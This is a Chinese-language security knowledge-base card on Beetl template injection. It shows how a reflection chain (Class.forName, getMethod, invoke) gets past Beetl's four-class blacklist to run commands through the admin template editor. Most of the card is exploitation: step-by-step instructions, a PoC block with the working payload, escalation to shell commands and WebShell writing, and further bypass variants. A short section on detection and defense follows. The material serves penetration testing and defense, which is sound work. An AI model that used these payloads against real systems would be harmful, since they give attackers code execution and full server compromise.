---
id: web-generic-ssti-beetl-static-class-reflect-runtime-blacklist-bypass
title: Beetl 模板 ${@类.方法} 静态调用：java.lang Runtime/Process 被禁后改用 Class.forName 反射串出命令执行
type: scenario
domain: web
path: web/generic/ssti
technique: beetl-static-class-reflect-runtime-blacklist-bypass
tags:
- java
- ssti
- beetl
- template-injection
- reflection
- blacklist-bypass
- rce
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-W2
  verified_at: '2026-11-08T12:05:12+08:00'
  notes: 已对照原文核对：Beetl \ 静态调用、java.lang 下 Runtime/Process/ProcessBuilder/System 四个类名黑名单、Class.forName+getMethod(...,null)+invoke 反射链 payload 与原文逐字一致；后台模板编辑写入即可弹计算器（原文截图）；未设 affected_versions（原文只提 beetl3 文档，未标受影响区间）；未复跑
url: /docs/web/generic/ssti/web-generic-ssti-beetl-static-class-reflect-runtime-blacklist-bypass/
draft: false
kb_aliases:
- Beetl SSTI
- Beetl 模板注入
- ${@类.方法}
- java.lang 黑名单绕过
- Class.forName 反射 RCE
- 后台模板编辑 getshell
---

## 一句话结论

Beetl 模板支持 `${@全限定类名.静态方法(...)}` 语法直接调用任意 Java 类的静态方法，因此后台“模板编辑”功能一旦可写就能 RCE；Beetl 自带的 `ClassLoader`/安全控制只把 `java.lang.Runtime`、`java.lang.Process`、`java.lang.ProcessBuilder`、`java.lang.System` 这 4 个类名挡掉，用 `Class.forName("java.lang.Runtime")` 拿 `Method` 再 `invoke` 即可完全绕过，一条表达式就能弹出计算器/执行命令。

## 原理

- **`${@类.方法}` 是设计特性不是漏洞**：Beetl 允许模板里用 `@` 前缀引用 Java 类并调用其静态方法，官方文档明确把它当作“模板里能用 Java 代码”的能力（`${@java.lang.Math.max(1,2)}` 之类）。所以“能编辑模板”等价于“能执行任意 Java 代码”。
- **黑名单只认类名字符串**：Beetl 的 `getClass`/安全判定是 `pkgName.startsWith("java.lang") && className.equals("Runtime") || Process || ProcessBuilder || System`，也就是只匹配这 4 个**字面类名**；`java.lang.Class`、`java.lang.reflect.Method`、`java.lang.String` 都不在名单里。
- **反射绕过**：`${@java.lang.Class.forName("java.lang.Runtime").getMethod("exec",@java.lang.Class.forName("java.lang.String")).invoke(@java.lang.Class.forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null),"calc")}`——全程只出现 `Class`、`String`、`Method`（通过 `getMethod` 返回值隐式获得），没有任何 `Runtime`/`Process` 的**类名位置**，但运行时仍构造出 `Runtime.getRuntime().exec("calc")`。
- **为什么 `getMethod(...,null)` 也能过**：`getMethod("getRuntime", null)` 传 `null` 而不是 `Class[]{...}`，Java 会把它当作“无参方法”的变长参数空数组，因此能取到 `getRuntime()`；这是原文最终 payload 的写法，比 `new Class[]{...}` 更短且不出现数组类型名。
- **落地位置决定危害**：模板编辑在后台，一般要求管理员；但结合弱口令/CSRF/后台任意文件写，即可把“后台功能”降级成“可远程触发”。Beetl 模板改动会立即生效（无需重启），所以执行时机就是下一次页面渲染。

## 触发条件

- 应用使用 Beetl（常见于 JFinal 系 CMS，如 jfinal cms 的 `/admin/template` 模板编辑）作为模板引擎。
- 攻击者能写入/修改模板内容（后台模板管理、模板文件任意写、路径穿越写模板等）。
- Beetl 版本使用上述 4 类黑名单（原文对应 Beetl 3.x 的默认安全控制），且模板里可执行 `@` 静态调用。
- 模板所在页面能被访问触发渲染（保存后访问首页/对应页面即可）。

## 利用步骤

1. 确认引擎：报错信息、模板语法（`#{}`、`${}`、`@if`）、依赖 `com.ibeetl:beetl`；或直接看后台模板编辑页的“语法帮助”。
2. 先验证 `@` 调用可用：写入 `${@java.lang.Math.max(1,2)}` 保存后访问页面，输出 `2` 即确认。
3. 试直连（大概率被拦）：`${@java.lang.Runtime.getRuntime().exec("calc")}`，若报“class not allowed”类错误说明黑名单生效。
4. 换反射链：写入 `${@java.lang.Class.forName("java.lang.Runtime").getMethod("exec",@java.lang.Class.forName("java.lang.String")).invoke(@java.lang.Class.forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null),"calc")}`。
5. 保存后访问该模板对应页面，观察命令是否执行（Linux 上把 `calc` 换成 `id`/`touch /tmp/pwned`，无回显时用 DNSLog 或写文件验证）。
6. 需要回显时把命令改成 `sh -c "id > /tmp/o"` 再通过任意文件读接口取回；或直接写 WebShell 文件。
7. 清理：恢复模板原内容，删除测试产物。

## PoC

```text
# 1) 探路：确认 @ 静态调用可用
${@java.lang.Math.max(1,2)}

# 2) 直连（被 java.lang 黑名单拦住）
${@java.lang.Runtime.getRuntime().exec("calc")}

# 3) 反射绕过（原文最终 payload）
${@java.lang.Class.forName("java.lang.Runtime").getMethod("exec",@java.lang.Class.forName("java.lang.String")).invoke(@java.lang.Class.forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null),"calc")}
```

等价 Java 语义：

```java
Class<?> c = Class.forName("java.lang.Runtime");
Method exec = c.getMethod("exec", String.class);
Object rt = c.getMethod("getRuntime", null).invoke(null, null);
exec.invoke(rt, "calc");
```

## 变体与关联

- 变体：黑名单升级（连 `Class.forName` 也拦）时改用 `@java.lang.ClassLoader`、`@javax.script.ScriptEngineManager`（Nashorn/Groovy）或 `@org.springframework...` 等不在名单的类；Beetl 的 `@` 语法本身无法禁用类名白名单之外的反射能力。
- 变体：不能写模板时，找“模板内容来自用户输入”的渲染点（文章正文二次渲染、邮件/消息模板），把 `${...}` 塞进业务数据形成存储型 SSTI。
- 变体：JFinal 系 CMS 常见组合链——后台 `filemanager` 写 `.html` 模板文件 + 模板编辑触发（见同批次的 FileManager 任意文件读写卡）。
- 关联：[[web-generic-ssti-engine-identification-decision-tree-errors]]（先判引擎）、[[web-generic-ssti-velocity-evaluate-string-template-rce]]（同为 Java 模板引擎的字符串求值）、[[web-generic-ssti-freemarker-safer-resolver-bypass]]（另一引擎的黑名单绕过）。

## 检测与防御

- 修复：禁止后台模板编辑，或把模板目录与业务代码隔离；Beetl 侧用 `NativeSecurityManager` 的自定义实现做**类名白名单**（而不是 4 个类的黑名单），并禁止 `@` 语法（`ENGINE.enableNativeCall()` 之外全部关闭）。
- 加固：模板内容纳入版本管理与文件完整性监控，任何变更需审批；后台模板编辑接口加二次认证与操作审计。
- 检测：模板文件中出现 `${@`、`Class.forName`、`getMethod`、`invoke`、`getRuntime`；渲染进程拉起 `calc/sh/bash` 等子进程；模板文件 mtime 异常变更。
- 响应：回滚模板、排查同时间窗内的后台登录与文件写入、按“应用服务器已失陷”处置（可能已写入内存马）。
